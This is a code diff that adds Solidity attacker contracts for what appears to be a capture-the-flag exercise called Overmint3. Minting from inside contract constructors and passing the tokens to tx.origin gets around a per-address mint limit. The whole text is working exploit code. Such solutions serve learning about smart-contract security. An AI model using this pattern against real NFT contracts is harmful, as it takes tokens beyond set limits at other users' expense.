@@ -18,3 +18,21 @@ contract Overmint3 is ERC721 {
         amountMinted[msg.sender]++;
     }
 }
+
+contract Overmint3Attacker {
+    constructor(address _victim) {
+        Overmint3 victim = Overmint3(_victim);
+
+        while (victim.balanceOf(tx.origin) < 5) {
+            new Overmint3Minter(_victim);
+        }
+    }
+}
+
+contract Overmint3Minter {
+    constructor(address _victim) {
+        Overmint3 victim = Overmint3(_victim);
+        victim.mint();
+        victim.safeTransferFrom(address(this), tx.origin, victim.totalSupply());
+    }
+}
